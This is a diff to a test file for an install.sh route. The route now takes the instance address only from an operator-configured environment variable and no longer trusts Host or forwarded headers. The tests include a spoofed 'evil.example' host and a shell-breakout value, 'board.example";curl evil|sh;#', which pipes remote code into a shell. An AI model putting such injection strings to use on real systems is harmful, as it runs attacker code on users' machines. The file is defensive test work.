@@ -1,6 +1,6 @@
 import { readFile } from "node:fs/promises";
 import { resolve } from "node:path";
-import { describe, expect, it } from "vitest";
+import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { GET } from "./route";
 
 const canonical = () => readFile(resolve(process.cwd(), "../../install.sh"), "utf8");
@@ -21,6 +21,15 @@ describe("GET /install.sh", () => {
 });
 
 describe("GET /install.sh?code=NNNNNN", () => {
+  // The instance address written into the script comes from the operator's
+  // OVERCLICK_PUBLIC_URL, never from Host or x-forwarded-*, which the caller writes.
+  beforeEach(() => {
+    process.env.OVERCLICK_PUBLIC_URL = "https://board.example";
+  });
+  afterEach(() => {
+    delete process.env.OVERCLICK_PUBLIC_URL;
+  });
+
   it("answers the instance and the code the script would otherwise ask for", async () => {
     const response = await GET(request("https://board.example/install.sh?code=482913"));
     const body = await response.text();
@@ -52,18 +61,56 @@ describe("GET /install.sh?code=NNNNNN", () => {
     expect(response.headers.get("cache-control")).toBe("no-store, private");
   });
 
-  it("follows the forwarded scheme, because the command it builds is a URL we own", async () => {
+  it("ignores Host and the forwarded headers: the address is the configured one", async () => {
     const response = await GET(
-      request("http://board.example/install.sh?code=482913", { "x-forwarded-proto": "https, http" }),
+      request("https://evil.example/install.sh?code=482913", {
+        host: "evil.example",
+        "x-forwarded-host": "evil.example",
+        "x-forwarded-proto": "http",
+      }),
     );
-    expect(await response.text()).toContain("https://board.example");
+    const body = await response.text();
+    expect(body).toContain(":-https://board.example}");
+    expect(body).not.toContain("evil.example");
   });
 
-  it("treats a bare localhost as http, the one case that is not TLS", async () => {
-    const response = await GET(
-      request("http://localhost:3000/install.sh?code=482913", { host: "localhost:3000" }),
-    );
-    expect(await response.text()).toContain("http://localhost:3000");
+  it("writes only the origin of the configured address, not a path or credentials", async () => {
+    process.env.OVERCLICK_PUBLIC_URL = "https://board.example/some/path?x=1";
+    const body = await (await GET(request("https://board.example/install.sh?code=482913"))).text();
+    expect(body).toContain(":-https://board.example}");
+    expect(body).not.toContain("some/path");
+  });
+
+  it("keeps http for a configured local address, the one case that is not TLS", async () => {
+    process.env.OVERCLICK_PUBLIC_URL = "http://localhost:3000";
+    const response = await GET(request("http://localhost:3000/install.sh?code=482913", { host: "localhost:3000" }));
+    expect(await response.text()).toContain(":-http://localhost:3000}");
+  });
+
+  it("serves no paired installer when OVERCLICK_PUBLIC_URL is unset", async () => {
+    delete process.env.OVERCLICK_PUBLIC_URL;
+    const original = await canonical();
+    const response = await GET(request("https://board.example/install.sh?code=482913"));
+    const body = await response.text();
+
+    expect(body).toBe(original);
+    expect(body).not.toContain("482913");
+    expect(response.headers.get("cache-control")).toBe("public, max-age=300");
+  });
+
+  it("serves no paired installer when OVERCLICK_PUBLIC_URL is not a plain origin", async () => {
+    const original = await canonical();
+    for (const value of [
+      "not a url",
+      "ftp://board.example",
+      "http://board.example",
+      "https://user:pw@board.example",
+      'https://board.example";curl evil|sh;#',
+    ]) {
+      process.env.OVERCLICK_PUBLIC_URL = value;
+      const response = await GET(request("https://board.example/install.sh?code=482913"));
+      expect(await response.text()).toBe(original);
+    }
   });
 
   it("ignores anything that is not exactly six digits", async () => {
@@ -74,15 +121,5 @@ describe("GET /install.sh?code=NNNNNN", () => {
       );
       expect(await response.text()).toBe(original);
     }
-  });
-
-  it("refuses to write a host that could break out of the shell string", async () => {
-    const original = await canonical();
-    const response = await GET(
-      request("https://board.example/install.sh?code=482913", {
-        host: 'board.example";curl evil|sh;#',
-      }),
-    );
-    expect(await response.text()).toBe(original);
   });
 });
